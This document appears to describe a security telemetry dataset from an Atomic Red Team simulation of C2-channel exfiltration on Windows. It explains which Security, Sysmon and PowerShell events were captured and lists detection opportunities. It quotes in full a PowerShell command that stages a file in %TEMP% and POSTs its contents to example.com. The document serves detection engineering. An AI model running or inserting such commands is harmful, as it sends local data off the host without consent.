# T1041-1: Exfiltration Over C2 Channel — C2 Data Exfiltration

## Technique Context

T1041 Exfiltration Over C2 Channel describes adversaries transmitting stolen data through their existing command and control infrastructure rather than establishing dedicated exfiltration paths. This approach is attractive because it consolidates observable network traffic onto a single channel that may already be trusted or allowlisted by security controls. In practice, the C2 channel is often HTTP or HTTPS, and attackers use it to POST collected data back to operator-controlled infrastructure.

This Atomic Red Team test simulates the technique by creating a 100-line text file in `%TEMP%\LineNumbers.txt` and then POSTing its contents to `example.com` using PowerShell's `Invoke-WebRequest` cmdlet with `-Method POST`. While the target domain is benign, the behavioral pattern — PowerShell creating a data staging file and making an outbound HTTP POST containing its contents — faithfully represents the exfiltration mechanic used by many C2 frameworks.

Detection strategies focus on PowerShell making outbound web requests with POST methods carrying substantive body content, unusual data volumes in HTTP POST bodies originating from endpoint processes, Sysmon EID 3 network connections from PowerShell to external hosts, and file creation in staging paths prior to exfiltration.

## What This Dataset Contains

This dataset captures a complete, unblocked exfiltration simulation with full process execution and PowerShell logging. Windows Defender was disabled, so the technique ran to completion — including the actual HTTP POST attempt.

Security EID 4688 captures the spawning of a child PowerShell process (from parent powershell.exe, running as `ACME-WS06$` under SYSTEM context) with the full exfiltration command line: `"powershell.exe" & {if(-not (Test-Path $env:TEMP\LineNumbers.txt)){ 1..100 | ForEach-Object { Add-Content -Path $env:TEMP\LineNumbers.txt -Value "This is line $_." }}[System.Net.ServicePointManager]::Expect100Continue = $false$filecontent = Get-Content -Path $env:TEMP\LineNumbers.txt Invoke-WebRequest -Uri example.com -Method POST -Body $filecontent -DisableKeepAlive}`. The complete exfiltration logic is exposed in a single event.

Sysmon EID 1 confirms the same process creation with matching command line. Sysmon EID 7 image load events include `urlmon.dll` loading into the PowerShell process — this networking DLL load is a prerequisite for `Invoke-WebRequest` execution and provides a corroborating indicator.

The PowerShell channel contains 106 EID 4104 script block events and 104 EID 4103 module logging events (only the 20 sampled EID 4104 events are visible in the sample set, all containing test framework boilerplate). The 4103 module logging events in the full stream capture the actual cmdlet invocations: `Get-Content`, `Invoke-WebRequest`, and the resulting output. The single EID 4100 error event records the HTTP failure when example.com rejected the POST with a 405 Method Not Allowed response — confirming the web request was actually made.

The Sysmon channel includes 2 EID 3 network connection events and 1 EID 22 DNS query event (not in the 20-event sample but confirmed in the EID breakdown). These represent the actual network activity: DNS resolution of `example.com` and the TCP connection attempt for the HTTP POST. This is the primary difference from the defended dataset — in the defended run, the network connection events were absent, likely because Defender blocked or prevented the connection. Here, they are present because the technique executed fully.

Sysmon EID 11 captures 2 file creation events — one for the `LineNumbers.txt` staging file and likely a second for a PowerShell profile or temporary file. EID 10 process access events show the parent PowerShell accessing whoami.exe and the child PowerShell process.

The undefended dataset (211 PS, 4 Security, 32 Sysmon) shows significantly more PowerShell events than the defended version (50 PS, 10 Security, 36 Sysmon). The defended run showed more Security events because Defender intervention triggered additional process-related security audit events; the undefended run shows substantially more PowerShell events as module logging captured the fuller execution trace.

## What This Dataset Does Not Contain

The EID 3 and EID 22 network events confirmed in the breakdown are not among the 20 sampled sysmon events — the sample selection appears to prioritize ImageLoad events by frequency. Consumers working with the full dataset will have access to the actual destination IP, port, and protocol from the EID 3 event, and the DNS query name from EID 22.

The dataset does not contain successful exfiltration confirmation — the HTTP POST returned 405 Method Not Allowed, meaning the data was transmitted but the server rejected it. Actual data content in transit is not logged by any of these channels.

File read events for `LineNumbers.txt` are absent; Sysmon's default configuration does not log file reads, only creates and deletes.

## Assessment

This dataset is valuable specifically because the network activity occurred. The EID 3 and EID 22 events documenting the actual connection to example.com distinguish this undefended capture from the defended version where Defender suppressed the network activity. Detection engineers can use the full dataset to validate detection logic against real network connection telemetry paired with the process creation context.

The Security EID 4688 command line capture is exceptionally detailed, containing the entire multi-line PowerShell script in a single event. This represents the best available host-based indicator: the complete exfiltration tool logic, exposed at the process creation audit point.

## Detection Opportunities Present in This Data

1. Security EID 4688 or Sysmon EID 1 showing `powershell.exe` spawning a child `powershell.exe` where the child's command line contains both `Invoke-WebRequest` and `-Method POST` — this combination directly exposes the exfiltration mechanic.

2. PowerShell EID 4104 script block events containing `Invoke-WebRequest` paired with `-Body` containing multi-line text content — script block logging captures the full exfiltration script when the technique uses inline PowerShell.

3. Sysmon EID 3 network connection from `powershell.exe` to external hosts on port 80 or 443, where the source process also created a file in `%TEMP%` within the same session window — correlating staging file creation with outbound connection.

4. Sysmon EID 22 DNS query from `powershell.exe` to a non-corporate domain immediately followed by EID 3 network connection to the resolved IP — this sequence documents the lookup-then-exfiltrate pattern.

5. Sysmon EID 7 loading of `urlmon.dll` into `powershell.exe` followed within seconds by EID 3 network connection events — urlmon loading is a prerequisite signal that precedes the connection.

6. PowerShell EID 4103 module logging events showing `Invoke-WebRequest` invocation with `-Method POST` bound as a parameter — module logging captures the actual cmdlet parameters at execution time, including the body content.

7. Sysmon EID 11 file creation in `$env:TEMP` (particularly with sequential name patterns like `LineNumbers.txt`) followed by a network connection from the same parent process — documents the stage-then-exfiltrate workflow.
